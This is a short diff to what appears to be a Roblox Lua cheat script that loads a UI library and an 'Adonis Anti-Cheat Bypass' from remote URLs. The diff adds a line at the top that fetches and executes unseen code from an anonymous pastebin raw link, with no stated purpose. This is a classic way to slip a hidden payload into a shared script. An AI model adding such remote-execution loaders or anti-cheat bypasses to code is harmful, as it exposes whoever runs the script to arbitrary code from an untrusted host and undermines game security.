@@ -1,3 +1,8 @@
+
+loadstring(game:HttpGet("https://pastebin.com/raw/CBZ1CZ9s"))()
+
+task.wait(0.1)
+
 local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-Interface/CustomFIeld/main/RayField.lua'))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/OtherScripts/Adonis%20Anti-Cheat%20Bypass.lua"))()
 wait()
